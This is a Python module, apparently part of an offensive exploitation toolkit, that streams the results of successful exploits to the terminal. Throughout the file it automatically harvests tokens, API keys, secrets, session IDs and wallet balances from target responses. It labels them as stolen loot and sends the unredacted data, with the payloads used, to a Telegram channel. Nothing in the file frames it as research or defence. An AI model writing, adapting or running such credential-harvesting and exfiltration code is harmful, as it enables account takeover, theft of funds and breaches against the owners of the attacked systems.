#!/usr/bin/env python3
"""
TELEMETRY.PY v8.0 — Live Offensive Streamer & Automated Loot Exfiltration Handler (With Telegram Telemetry)
Features:
- Automated high-value loot parsing (JWTs, API keys, wallet balances, admin tokens)
- Zero-disk in-memory exfiltration packaging
- Real-time zero-delay proof-of-work terminal rendering
- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
"""
import sys
import json
import asyncio
from modules.telegram_notifier import send_telegram_alert

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"
MAGENTA = "\033[95m"

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous telemetry streams."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def extract_valuable_loot(response_body):
    """Parses response bodies to automatically harvest high-value credentials, keys, and tokens."""
    looted_assets = {}
    if not response_body or not isinstance(response_body, str):
        return looted_assets

    try:
        data = json.loads(response_body)
        if isinstance(data, dict):
            for k, v in data.items():
                if any(sub in k.lower() for sub in ["token", "key", "secret", "balance", "wallet", "admin", "role", "session", "user_id"]):
                    looted_assets[k] = v
    except json.JSONDecodeError:
        pass

    return looted_assets

def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
    """
    Instantly streams verified proof-of-work, automatically extracts exfiltrated loot to the terminal,
    and broadcasts unredacted assets directly to Telegram.
    """
    sys.stdout.write(f"\n{RED}{BOLD}[***] LIVE EXPLOIT VERIFIED: {exploit_type.upper()} [***]{RESET}\n")
    sys.stdout.write(f"  ├── Target Endpoint : {NEON_BLUE}{endpoint}{RESET}\n")
    sys.stdout.write(f"  ├── Injected Payload: {YELLOW}{json.dumps(payload)}{RESET}\n")
    
    # Automatically parse and highlight exfiltrated high-value loot
    auto_loot = extract_valuable_loot(response_body)
    if auto_loot:
        sys.stdout.write(f"  ├── {MAGENTA}AUTOMATED LOOT EXPORT (HIGH-VALUE ASSETS):{RESET}\n")
        for l_key, l_val in auto_loot.items():
            sys.stdout.write(f"  │     └── {CYAN}{l_key}{RESET} : {MATRIX_GREEN}{l_val}{RESET}\n")

    sys.stdout.write(f"  └── STOLEN VALUE / PROOF:\n")
    
    proof_dict = {}
    if isinstance(proof_data, dict):
        for k, v in proof_data.items():
            sys.stdout.write(f"      ├── {CYAN}{k}{RESET} : {MATRIX_GREEN}{v}{RESET}\n")
            proof_dict[k] = v
    else:
        sys.stdout.write(f"      └── {MATRIX_GREEN}{str(proof_data)[:300]}{RESET}\n")
        proof_dict["proof"] = str(proof_data)
        
    sys.stdout.write(f"  └── Response Preview: {GREEN}{response_body[:150]}...{RESET}\n\n")
    sys.stdout.flush()

    # BROADCAST UNREDACTED EXPLOIT PROOF & LOOT STRAIGHT TO TELEGRAM
    telegram_payload = {
        "endpoint": endpoint,
        "payload": str(payload),
        "auto_loot": auto_loot,
        "proof": proof_dict,
        "response_preview": response_body[:300]
    }
    broadcast_tg_alert_sync(f"Live Exploit Verified [{exploit_type}]", telegram_payload)
